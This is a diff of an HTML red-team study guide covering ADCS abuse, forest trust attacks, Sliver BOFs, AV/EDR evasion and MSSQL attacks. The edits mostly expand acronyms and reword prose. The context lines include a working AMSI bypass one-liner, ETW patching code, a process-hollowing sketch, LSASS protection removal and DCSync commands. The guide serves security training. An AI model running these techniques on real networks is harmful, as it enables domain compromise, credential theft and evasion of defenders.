-<p>Active Directory Certificate Services (ADCS) is the CA that domains use to issue X.509 certificates for authentication, encryption, and signing. Its templates control who can enroll, for what purpose, and with which subject. When those templates drift, ADCS turns into one of the fastest paths to Domain Admin on Windows, cataloged as ESC1 through ESC15+ by the SpecterOps <em>Certified Pre-Owned</em> research. Most environments running ADCS have at least one exploitable template, and Certipy will find it in under a minute.</p>
+<p>Active Directory Certificate Services (ADCS) is the CA (Certificate Authority) that domains use to issue X.509 certificates for authentication, encryption, and signing. Its templates control who can enroll, for what purpose, and with which subject. When those templates drift, ADCS turns into one of the fastest paths to Domain Admin on Windows, cataloged as ESC1 through ESC15+ by the SpecterOps <em>Certified Pre-Owned</em> research. Most environments running ADCS have at least one exploitable template, and Certipy will find it in under a minute.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/adcs-esc1-template.png" alt="ADCS ESC1 vulnerable certificate template configuration" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-adcs-basics">9.1 Basics</h3>
@@ -2681,7 +2671,7 @@ copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid
 </table>
 
 <h3 id="cape-adcs-exploitation">9.3 Exploitation</h3>
-<p>Enumeration is the same across every ESC. Certipy flags vulnerable templates, CA misconfigurations, and PKI-object DACLs in a single sweep:</p>
+<p>Enumeration is the same across every ESC (Enrollment Service Configuration abuse category). Certipy flags vulnerable templates, CA misconfigurations, and PKI (Public Key Infrastructure) object DACLs in a single sweep:</p>
 <pre><code class="language-bash">certipy find -u user@domain.local -p pass -dc-ip &lt;dc&gt; -vulnerable -stdout</code></pre>
 <h4 id="cape-adcs-exploitation-methodology">Methodology</h4>
 <ul class="methodology-checklist">
@@ -3320,7 +3310,7 @@ SpoolSample.exe &lt;target&gt; &lt;attacker-fqdn&gt;</code></pre>
 </ul>
 
 <h2 id="cape-adcs-attacks-11">11. Active Directory Trust Attacks</h2>
-<p>Trust relationships between forests exist to let users, groups, and services cross a boundary that would otherwise be closed. The same pathway is what turns a compromise in one forest into an incident in another. Three techniques cover most of what I use in practice: forged inter-realm TGTs, MSSQL database link chains, and unconstrained delegation coercion across the trust. Each has a different prerequisite set and a different noise profile, and it is worth knowing all three before touching a trust boundary in earnest.</p>
+<p>Trust relationships between forests let users, groups, and services cross a boundary that would otherwise stop them. The same pathway is how a compromise in one forest becomes an incident in another. Three techniques cover almost all cross-trust work: forged inter-realm TGTs, MSSQL database link chains, and unconstrained delegation coercion across the trust. Each has different prerequisites and different noise; know all three before you touch a trust on a real engagement.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/ad-forest-domain-structure.png" alt="Active Directory forest and domain structure showing trust relationships" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-trust-types">11.0 Trust Types and What Each Allows</h3>
@@ -3338,7 +3328,7 @@ SpoolSample.exe &lt;target&gt; &lt;attacker-fqdn&gt;</code></pre>
 </table>
 <pre><code class="language-powershell"># Confirm the trust type before attacking
 Get-DomainTrust | Select-Object SourceName, TargetName, TrustType, TrustDirection, TrustAttributes</code></pre>
-<p>SID filtering enforcement is what decides whether SID history injection across an external or forest trust succeeds. Check the <code>TRUST_ATTRIBUTE_QUARANTINED_DOMAIN</code> and <code>TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL</code> bits inside <code>trustAttributes</code>, either bit means SID filtering is on and the SID history path is closed.</p>
+<p>SID filtering enforcement decides whether SID history injection across an external or forest trust succeeds. Check the <code>TRUST_ATTRIBUTE_QUARANTINED_DOMAIN</code> and <code>TRUST_ATTRIBUTE_TREAT_AS_EXTERNAL</code> bits inside <code>trustAttributes</code>. If either bit is set, SID filtering is on and the SID history path is closed.</p>
 
 <h3 id="cape-trust-forging">11.1 Forging Trust Tickets for Cross-Forest Access</h3>
 <p>Bidirectional forest trusts share a secret trust key that validates referrals between the two Kerberos services. Compromise a DA in one forest, extract the trust key, and forge an inter-realm TGT that impersonates users from your compromised forest into the trusted one. Access is bounded by what the trusted forest grants your side.</p>
@@ -3650,7 +3640,7 @@ Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security P
 <p>Subsequent logon credentials get logged to <code>C:\Windows\System32\kiwissp.log</code>.</p>
 
 <h3 id="cape-sliver-bofs">12.10 Beacon Object Files (BOFs)</h3>
-<p>Sliver runs BOFs compiled for its own COFF loader. A BOF is a small C program compiled to an object file that runs inside the implant process without spawning a new process. That keeps post-exploitation activity inside a single memory space and avoids the parent-child chains that behavioral sensors look for.</p>
+<p>Sliver runs BOFs (Beacon Object Files) compiled for its own COFF (Common Object File Format) loader. A BOF is a small C program compiled to an object file that runs inside the implant process without spawning a new process. That keeps post-exploitation activity inside a single memory space and avoids the parent-child chains that behavioral sensors look for.</p>
 <pre><code class="language-bash"># Load and run a BOF against the active session
 coff-loader &lt;path-to-bof.o&gt; &lt;args&gt;
 
@@ -3743,7 +3733,7 @@ execute-assembly SharpKatz.exe --Command dcsync --User krbtgt --Domain <domain.l
 <tr><td>Application whitelisting</td><td>Whether the binary is allowed to run at all</td><td>AppLocker, Windows Defender Application Control (WDAC)</td></tr>
 </tbody>
 </table>
-<p>Two moves cover every evasion. Change what the scanner sees, or run the code somewhere the scanner does not look. Signature bypasses (repacking, encryption, byte-level modification) sit in the first camp. Reflective loading, direct syscalls, and injection into already-trusted processes sit in the second. Every technique below is one of the two in a different disguise.</p>
+<p>Every evasion technique falls into one of two buckets. Repack the binary, encrypt the payload, or modify bytes to break the signature match. Or move execution to a code path the scanner never inspects: reflective loading, direct syscalls, injection into an already-trusted process. The techniques in the rest of this module are variations on those two.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/windows-defender-ui.png" alt="Windows Defender UI showing real-time protection settings" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-evasion-av-signature">13.1 How Signature-Based Detection Works</h3>
@@ -3901,7 +3891,7 @@ Find-AVSignature -StartByte 0 -EndByte max -Interval 100 -Path mimikatz.exe -Out
 <thead><tr><th>Approach</th><th>Mechanism</th><th>Trade-off</th></tr></thead>
 <tbody>
 <tr><td><code>mimidrv.sys</code></td><td>Load the signed driver shipped with Mimikatz, then <code>!+</code> followed by <code>!processprotect /process:lsass.exe /remove</code>.</td><td>Heavily signatured. Expect Defender and any modern EDR to catch it on load.</td></tr>
-<tr><td>Signed vulnerable driver</td><td>Use <code>RTCore64.sys</code>, <code>gdrv.sys</code>, or ProcExp with a helper like PPLKiller or PPLDump to write the EPROCESS <code>Protection</code> field and clear PPL on lsass.</td><td>Requires the target driver not to be on the Windows vulnerable-driver blocklist.</td></tr>
+<tr><td>Signed vulnerable driver</td><td>Use <code>RTCore64.sys</code>, <code>gdrv.sys</code>, or ProcExp with a helper like PPLKiller or PPLDump to write the EPROCESS (Executive Process) <code>Protection</code> field and clear PPL (Protected Process Light) on lsass.</td><td>Requires the target driver not to be on the Windows vulnerable-driver blocklist.</td></tr>
 <tr><td>Snapshot-based dumping</td><td>Duplicate a handle to lsass and read it out with nanodump, dumpert, HandleKatz, or MirrorDump. No driver, no protection bit toggle.</td><td>Quieter path in practice. Handle acquisition is the failure point if EDR blocks <code>PROCESS_VM_READ</code> to lsass.</td></tr>
 </tbody>
 </table>
@@ -3959,7 +3949,7 @@ powershell.exe -Version 2.0 -Command "Import-Module .\Invoke-Mimikatz.ps1;Invoke
 <p>Constrained Language Mode, AMSI, and AppLocker are three of the most consistently encountered controls once execution has landed on a modern managed endpoint. Each restricts a different layer of the runtime, and each has a well-known bypass primitive that costs nothing to try before falling back to something noisier.</p>
 
 <h4 id="cape-evasion-clm">13.9.1 Constrained Language Mode</h4>
-<p>CLM restricts PowerShell to a subset of the language, no .NET reflection, no COM objects, limited type accelerators. Check status:</p>
+<p>CLM (Constrained Language Mode) restricts PowerShell to a subset of the language, no .NET reflection, no COM objects, limited type accelerators. Check status:</p>
 <pre><code class="language-powershell">$ExecutionContext.SessionState.LanguageMode</code></pre>
 <p>Output <code>ConstrainedLanguage</code> means CLM is active. Bypass via <code>InstallUtil.exe</code>, which runs unrestricted:</p>
 <pre><code class="language-bash">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\malicious.exe</code></pre>
@@ -3971,7 +3961,7 @@ powershell.exe -Version 2.0 -Command "Import-Module .\Invoke-Mimikatz.ps1;Invoke
 <pre><code class="language-powershell">[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>
 
 <h3 id="cape-evasion-process-hollowing">13.9a Process Hollowing</h3>
-<p>Process hollowing spawns a benign process suspended, unmaps its executable section, writes new code into the resulting hole, fixes the entry point in the PEB, and resumes the thread. To a sensor, the process appears to be the benign one it launched; underneath, it is running the attacker's payload. Runs entirely from a single allocation and does not need to inject into an already-running process.</p>
+<p>Process hollowing spawns a benign process suspended, unmaps its executable section, writes new code into the resulting hole, fixes the entry point in the PEB (Process Environment Block), and resumes the thread. To a sensor, the process appears to be the benign one it launched; underneath, it is running the attacker's payload. Runs entirely from a single allocation and does not need to inject into an already-running process.</p>
 <pre><code class="language-c">// Sketch of the flow
 CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);
 GetThreadContext(pi.hThread, &amp;ctx);                    // Read the entry point
@@ -4005,7 +3995,7 @@ NtAllocateVirtualMemory ENDP</code></pre>
 <p>Two runtime problems: SSNs change between Windows builds, and the target ntdll may already be hooked. Hell's Gate resolves SSNs by walking ntdll's Export Address Table and reading them from the function prologue (the <code>mov eax, imm32</code> immediate). Halo's Gate is the fallback when the prologue is hooked: pick a neighbor that is not hooked and add or subtract the offset, since SSNs are sequential.</p>
 
 <h3 id="cape-evasion-etw">13.11 ETW Patching</h3>
-<p>Event Tracing for Windows (ETW) is what feeds a lot of the runtime telemetry EDRs consume, including managed .NET events like assembly loads and PowerShell scriptblock execution. Two lightweight patches disable ETW inside the current process.</p>
+<p>Event Tracing for Windows (ETW) feeds most of the runtime telemetry an EDR consumes, including managed .NET events like assembly loads and PowerShell scriptblock execution. Two lightweight patches disable ETW inside the current process.</p>
 <pre><code class="language-c">// Patch EtwEventWrite to return immediately: silences .NET ETW providers
 FARPROC hook = GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
 DWORD old;
@@ -4255,7 +4245,7 @@ int wmain(void) {
 <p>Two things the sketch leaves as an exercise. Any variant that hosts .NET assemblies needs the AMSI patch applied before <code>ExecuteAssembly</code> loads the CLR. The full PEB command-line rewrite needs a <code>ReadProcessMemory</code> / <code>WriteProcessMemory</code> pair against the child's PEB after <code>CreateProcessW</code>; the <code>fake_cmdline</code> argument seeds the initial value that the rewrite then overwrites once the process is up.</p>
 
 <h2 id="cape-mssql-14">14. MSSQL, Exchange, and SCCM Attacks</h2>
-<p>Enterprise infrastructure sitting alongside Active Directory quietly expands the attack surface well past the DC. MSSQL, Exchange, and SCCM each ship with privileged service accounts, permissive default configurations, and a set of legitimate administrative primitives that map directly onto lateral movement and privilege escalation when they are abused. These platforms are also often owned by different operational teams than AD itself, which is one of the reasons the same misconfigurations tend to persist for years after they are documented publicly.</p>
+<p>Enterprise infrastructure sitting alongside Active Directory quietly expands the attack surface well past the DC. MSSQL, Exchange, and SCCM (System Center Configuration Manager) each ship with privileged service accounts, permissive default configurations, and a set of legitimate administrative primitives that map directly onto lateral movement and privilege escalation when they are abused. These platforms are also often owned by different operational teams than AD itself, which is one of the reasons the same misconfigurations tend to persist for years after they are documented publicly.</p>
 <p style="text-align:center;"><img src="/assets/images/cape/ssms-object-explorer.png" alt="SQL Server Management Studio Object Explorer showing linked servers and databases" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-mssql-attacks">14.1 MSSQL Attacks</h3>
